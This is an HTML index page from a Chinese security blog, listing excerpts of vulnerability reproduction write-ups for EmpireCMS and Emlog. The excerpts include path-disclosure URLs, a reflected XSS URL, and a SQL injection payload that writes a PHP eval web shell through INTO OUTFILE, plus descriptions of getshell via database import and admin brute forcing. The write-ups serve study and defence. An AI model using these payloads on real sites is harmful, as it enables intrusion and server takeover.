@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/80/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-EmpireCMS/EmpireCMS 7.5 后台xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E5%90%8E%E5%8F%B0xss/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.683Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="EmpireCMS-7-5-后台xss"><a href="#EmpireCMS-7-5-后台xss" class="headerlink" title="EmpireCMS 7.5 后台xss"></a>EmpireCMS 7.5 后台xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞是由于代码只使用htmlspecialchars进行实体编码过滤,而且参数用的是ENT_QUOTES(编码双引号和单引号),还有addslashes函数处理,但是没有对任何恶意关键字进行过滤,从而导致攻击者使用别的关键字进行攻击。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>EmpireCMS 7.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞出现的页面在/e/admin/openpage/AdminPage.php,浏览漏洞页面代码,发现使用hRepPostStr函数对leftfile、title、mainfile参数进行处理</p>
+<p>1.png</p>
+<p>跟进hRepPostStr函数,发现htmlspecialchars进行实体编码过滤,而且参数用的是ENT_QUOTES(编码双引号和单引号)</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E5%90%8E%E5%8F%B0xss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E5%90%8E%E5%8F%B0xss/" data-id="cl5c2qoin0069y8v1h2crad57" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-EmpireCMS/EmpireCMS 7.5 前台xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E5%89%8D%E5%8F%B0xss/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.680Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="EmpireCMS-7-5-前台xss"><a href="#EmpireCMS-7-5-前台xss" class="headerlink" title="EmpireCMS 7.5 前台xss"></a>EmpireCMS 7.5 前台xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞是由于javascript获取url的参数,没有经过任何过滤,直接当作a标签和img标签的href属性和src属性输出。</p>
+<p>利用条件：需要开启会员空间功能</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>EmpireCMS 7.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>需要开启会员空间功能(默认关闭),登录后台开启会员空间功能。</p>
+<p>1.png</p>
+<p>漏洞出现的位置在/e/ViewImg/index.html,浏览代码,发现如下代码存在漏洞</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E5%89%8D%E5%8F%B0xss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/EmpireCMS/EmpireCMS%207.5%20%E5%89%8D%E5%8F%B0xss/" data-id="cl5c2qoin0068y8v14ucc074e" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-EmpireCMS/EmpireCMS 6.6-7.2 路径泄漏" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/EmpireCMS/EmpireCMS%206.6-7.2%20%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.678Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="EmpireCMS-6-6-7-2-路径泄漏"><a href="#EmpireCMS-6-6-7-2-路径泄漏" class="headerlink" title="EmpireCMS 6.6-7.2 路径泄漏"></a>EmpireCMS 6.6-7.2 路径泄漏</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>EmpireCMS 6.6-7.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC :"></a>POC :</h3><blockquote>
+<p>EmpireCMS 6.6 :</p>
+</blockquote>
+<pre><code>http://www.0-sec.org/e/admin/tool/ShowPic.php?url[]=kongxin&amp;pic_height[]=kongxin&amp;pic_width[]=kongxin&amp;picurl[]=kongxin&amp; 
+
+http://www.0-sec.org/e/action/ListInfo.php?totalnum[]=kongxin&amp;page[]=kongxin&amp;myorder[]=kongxin&amp;orderby[]=kongxin&amp;andor[]=kongxin&amp;ph[]=kongxin&amp;tempid[]=kongxin&amp;line[]=kongxin&amp;endtime[]=kongxin&amp;starttime[]=kongxin&amp;ztid[]=kongxin&amp;ttid[]=kongxin&amp;classid[]=kongxin&amp;mid[]=kongxin&amp;
+</code></pre>
+<blockquote>
+<p>EmpireCMS 7.0 :</p>
+</blockquote>
+<pre><code>http://www.0-sec.org/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&amp;sinfo[]=kongxin&amp;modtype[]=kongxin&amp;infoid[]=kongxin&amp;filepass[]=kongxin&amp;classid[]=kongxin&amp;showmod[]=kongxin&amp;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/EmpireCMS/EmpireCMS%206.6-7.2%20%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/EmpireCMS/EmpireCMS%206.6-7.2%20%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F/" data-id="cl5c2qoim0065y8v19pexex4y" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-EmpireCMS/EmpireCMS 6.0 搜索框xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/EmpireCMS/EmpireCMS%206.0%20%E6%90%9C%E7%B4%A2%E6%A1%86xss/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.675Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="EmpireCMS-6-0-搜索框xss"><a href="#EmpireCMS-6-0-搜索框xss" class="headerlink" title="EmpireCMS 6.0 搜索框xss"></a>EmpireCMS 6.0 搜索框xss</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>EmpireCMS 6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>https://www.0-sec.org/search/keyword/index.php?allsame=3&quot;&gt;&lt;script&gt;alert(/zerosec/)&lt;/script&gt;
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/EmpireCMS/EmpireCMS%206.0%20%E6%90%9C%E7%B4%A2%E6%A1%86xss/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/EmpireCMS/EmpireCMS%206.0%20%E6%90%9C%E7%B4%A2%E6%A1%86xss/" data-id="cl5c2qoim0066y8v189rq0ym3" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Emlog/Emlog 越权&amp;后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Emlog/Emlog%20%E8%B6%8A%E6%9D%83&%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.489Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Emlog-越权-amp-后台getshell"><a href="#Emlog-越权-amp-后台getshell" class="headerlink" title="Emlog 越权&amp;后台getshell"></a>Emlog 越权&amp;后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="安装漏洞"><a href="#安装漏洞" class="headerlink" title="安装漏洞"></a>安装漏洞</h4><p>​ 其实一般代码审计都是从安装文件开始审计，一般安装脚本主要存在如下漏洞：</p>
+<pre><code>无验证功能，任意重装覆盖
+表单不做过滤写入config.php导致getshell
+$_GET[&#39;step&#39;]跳过限制步骤
+漏洞文件：install.php
+</code></pre>
+<p>​​首先我们直奔第一个点能否任意重装，我们可以看到必须常量DEL_INSTALLER为1的时候才会触发删除install.php,那么我们追踪DEL_INSTALLER看看</p>
+<p><img src="/resource/Emlog%E8%B6%8A%E6%9D%83&%E5%90%8E%E5%8F%B0getshell/media/rId26.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Emlog/Emlog%20%E8%B6%8A%E6%9D%83&%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Emlog/Emlog%20%E8%B6%8A%E6%9D%83&%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qoft0064y8v14rcbb91g" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Emlog/Emlog 相册插件前台SQL注入+Getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Emlog/Emlog%20%E7%9B%B8%E5%86%8C%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5+Getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.487Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Emlog-相册插件前台SQL注入-Getshell"><a href="#Emlog-相册插件前台SQL注入-Getshell" class="headerlink" title="Emlog 相册插件前台SQL注入+Getshell"></a>Emlog 相册插件前台SQL注入+Getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先安装Emlog的相册的插件</p>
+<p><img src="/resource/Emlog%E7%9B%B8%E5%86%8C%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5+Getshell/media/rId25.png"></p>
+<p>安装之后可以在目录：emlog\src\content\plugins\kl_album下找到所有的安装文件：</p>
+<p><img src="/resource/Emlog%E7%9B%B8%E5%86%8C%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5+Getshell/media/rId26.png"></p>
+<p>之后我们分析Kl-album_ajax_do.php文件</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Emlog/Emlog%20%E7%9B%B8%E5%86%8C%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5+Getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Emlog/Emlog%20%E7%9B%B8%E5%86%8C%E6%8F%92%E4%BB%B6%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5+Getshell/" data-id="cl5c2qoft0063y8v19fu03at4" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Emlog/Emlog 友情链接自助插件存在SQL注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Emlog/Emlog%20%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%E8%87%AA%E5%8A%A9%E6%8F%92%E4%BB%B6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.484Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Emlog-友情链接自助插件存在SQL注入漏洞"><a href="#Emlog-友情链接自助插件存在SQL注入漏洞" class="headerlink" title="Emlog 友情链接自助插件存在SQL注入漏洞"></a>Emlog 友情链接自助插件存在SQL注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在该插件当中的link_web.php文件中，直接将用户提交的数据进行了拼接，之后直接带入了查询，未经过任何的过滤操作，由此一个典型的SQL注入漏洞就这样简易的诞生了：</p>
+<p><img src="/resource/Emlog%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%E8%87%AA%E5%8A%A9%E6%8F%92%E4%BB%B6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>由于这里的参数都没有经过过滤，所以我们可以对任意参数进行验证，进行SQL注入，首先我们可以提交正常的访问请求，之后使用burpsuite进行抓包，之后改包，我们这里以URL为例：</p>
+<p>在抓取到数据包之后，我们可以将url改为以下内容：</p>
+<pre><code>url=http://0-sec.org&#39; union select 1,2,3,4,5,&#39;&lt;?php eval($_GET[cmd]); ?&gt;&#39; into outfile &#39;c:\\phpstudy\\www\\shell.php&#39; 
+</code></pre>
+<p>之后，这条语句会正常执行，同时也会在C:\phpstudy\www\下生成一个shell.php，而且该shell.php中的内容正是我们之前写入的一句话，之后我们可以使用菜刀进行连接。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Emlog/Emlog%20%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%E8%87%AA%E5%8A%A9%E6%8F%92%E4%BB%B6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Emlog/Emlog%20%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%E8%87%AA%E5%8A%A9%E6%8F%92%E4%BB%B6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qoft0062y8v1bjt62rjv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Emlog/Emlog phpinfo 泄漏" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Emlog/Emlog%20phpinfo%20%E6%B3%84%E6%BC%8F/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.482Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Emlog-phpinfo-泄漏"><a href="#Emlog-phpinfo-泄漏" class="headerlink" title="Emlog phpinfo 泄漏"></a>Emlog phpinfo 泄漏</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>需要登陆（至少是网站的会员/作者权限）</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先看看漏洞出现的位置：</p>
+<p><img src="/resource/Emlogphpinfo%E6%B3%84%E6%BC%8F/media/rId24.png"></p>
+<p>如上图，我们只要构造如下的URL：</p>
+<pre><code>http://www.0-sec.org:81/admin/index.php?action=phpinfo
+</code></pre>
+<p>直接访问：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Emlog/Emlog%20phpinfo%20%E6%B3%84%E6%BC%8F/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Emlog/Emlog%20phpinfo%20%E6%B3%84%E6%BC%8F/" data-id="cl5c2qofs0061y8v16pod4wf8" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Emlog/Emlog 6.0 数据库备份与导入功能导致后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Emlog/Emlog%206.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E4%B8%8E%E5%AF%BC%E5%85%A5%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.479Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Emlog-6-0-数据库备份与导入功能导致后台getshell"><a href="#Emlog-6-0-数据库备份与导入功能导致后台getshell" class="headerlink" title="Emlog 6.0 数据库备份与导入功能导致后台getshell"></a>Emlog 6.0 数据库备份与导入功能导致后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Emlog&lt;=6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>备份数据库到本地：</p>
+<p><img src="/resource/Emlog6.0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E4%B8%8E%E5%AF%BC%E5%85%A5%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E5%90%8E%E5%8F%B0getshell/media/rId24.png"></p>
+<p>修改数据库文件，将备份的数据库文件进行修改，在最后一段添加上自己构造的SQL语句：</p>
+<p><img src="/resource/Emlog6.0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E4%B8%8E%E5%AF%BC%E5%85%A5%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E5%90%8E%E5%8F%B0getshell/media/rId25.png"></p>
+<p>这一段sql语句主要功能是：首先判断是否存在emlog_shell数据表，如果存在则删除该表，之后创建一个新的emlog数据表，之后再向该表中添加信息（这里可以填入一句话木马），之后使用select.….<br> into  outfile<br> .…将数据表中的表项内容读入到一个shell.php的PHP文件汇总，之后再删除该数据表！</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Emlog/Emlog%206.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E4%B8%8E%E5%AF%BC%E5%85%A5%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Emlog/Emlog%206.0%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E4%B8%8E%E5%AF%BC%E5%85%A5%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qofs0060y8v18dtgep9w" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Emlog/Emlog 6.0 后台暴力破解" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Emlog/Emlog%206.0%20%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.477Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Emlog-6-0-后台暴力破解"><a href="#Emlog-6-0-后台暴力破解" class="headerlink" title="Emlog 6.0 后台暴力破解"></a>Emlog 6.0 后台暴力破解</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Emlog博客系统默认后台登陆地址为http://域名/admin/login.php而后台登陆时，错误情况下，验证码未刷新，导致可暴力破解登陆管理员账号低危漏洞，但是在emlog5.3.1和6.0测试版本均存在<br>...</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>emlog5.3.1和6.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/resource/Emlog6.0%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/media/rId24.png"></p>
+<p>访问</p>
+<pre><code>http://0-sec.org:81/admin/
+</code></pre>
+<p><img src="/resource/Emlog6.0%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/media/rId25.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Emlog/Emlog%206.0%20%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Emlog/Emlog%206.0%20%E5%90%8E%E5%8F%B0%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" data-id="cl5c2qofs005zy8v13i1z3bdw" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/79/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/78/">78</a><a class="page-number" href="/page/79/">79</a><span class="page-number current">80</span><a class="page-number" href="/page/81/">81</a><a class="page-number" href="/page/82/">82</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/81/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
